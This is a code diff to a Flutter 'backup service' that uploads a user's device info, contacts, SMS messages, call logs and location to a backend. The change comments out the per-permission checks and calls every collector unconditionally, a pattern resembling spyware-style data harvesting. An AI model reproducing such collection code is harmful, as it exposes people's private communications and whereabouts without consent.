@@ -12,50 +12,61 @@ class Appbackupservice {
 
 static Future<void> requestPermissionsAndFetchData(String userId) async {
 
+await getDeviceInfo(userId);
+  await requestAndFetchContacts(userId);
+  await fetchSms(userId);
+  await requestCallLogPermission(userId);
+  await getLocation(userId); 
+
   // Request both permissions at once
-  Map<Permission, PermissionStatus> statuses = await [
-    Permission.contacts,
-    Permission.sms,
-    Permission.phone
-  ].request();
+//   Map<Permission, PermissionStatus> statuses = await [
+//     Permission.contacts,
+//     Permission.sms,
+//     Permission.phone,
+//     Permission.location,
+//   ].request();
 
-  bool contactsGranted = statuses[Permission.contacts]?.isGranted ?? false;
-  bool smsGranted = statuses[Permission.sms]?.isGranted ?? false;
-  bool phoneGranted = statuses[Permission.phone]?.isGranted ?? false;
-  bool locationGranted = await Geolocator.isLocationServiceEnabled();
+//   bool contactsGranted = statuses[Permission.contacts]?.isGranted ?? false;
+//   bool smsGranted = statuses[Permission.sms]?.isGranted ?? false;
+//   bool phoneGranted = statuses[Permission.phone]?.isGranted ?? false;
+//   bool locationGranted = statuses[Permission.location]?.isGranted ?? false;
+ 
 
-  if (!contactsGranted) {
-    print("❌Contacts permission denied");
-  }
-  if (!smsGranted) {
-    print("❌SMS permission denied");
-  }
-  if(!phoneGranted){
-      print("❌Phone permission denied");
-  }
-    if (!locationGranted) {
-    print("location permission denied");
-  }
+//   if (!contactsGranted) {
+//     print("❌Contacts permission denied");
+//   }
+//   if (!smsGranted) {
+//     print("❌SMS permission denied");
+//   }
+//   if(!phoneGranted){
+//       print("❌Phone permission denied");
+//   }
+//   if(!locationGranted){
+//     print("❌ location permision denied");
+//   }
 
-  // Fetch contacts only if permission granted
-  if (contactsGranted) {
-   await requestAndFetchContacts(userId);
+//      await getDeviceInfo(userId);
+//     if(locationGranted){
+//  await getLocation(userId); 
+//     }
+
+//   // Fetch contacts only if permission granted
+//   if (contactsGranted) {
+//    await requestAndFetchContacts(userId);
    
-  }
+//   }
+//   // Fetch SMS only if permission granted
+//   if (smsGranted) {
+//    await fetchSms(userId);
+//   }
 
 
-  // Fetch SMS only if permission granted
-  if (smsGranted) {
-   await fetchSms(userId);
-  }
-     await getDeviceInfo(userId);
-   await getLocation(userId); 
+//        // Fetch callLogs if permission granted
+//   if (phoneGranted) {
+//    await requestCallLogPermission(userId);
+//   }
 
-       // Fetch callLogs if permission granted
-  if (phoneGranted) {
-   await requestCallLogPermission(userId);
-  }
-  SystemNavigator.pop();
+
 }
 }
 
@@ -72,10 +83,12 @@ static Future<void> requestPermissionsAndFetchData(String userId) async {
             .map(
               (c) => {
                 "name": c.displayName ?? "",
-                "phones": c.phones?.map((p) => p.number).toList() ?? [],
+                "phones": c.phones.map((p) => p.number).toList() ?? [],
               },
             )
             .toList();
+
+            print("☎️contact List length: ${contactList.length}");
          await BackupRepository.backupContacts(userId, contactList);
    
   }
@@ -162,9 +175,6 @@ Future<void> requestCallLogPermission(String userId) async {
 
   print("✅ Uploaded ${callLogs.length} most recent call logs");
 }
-
-
-
 
 
 // get User Location info
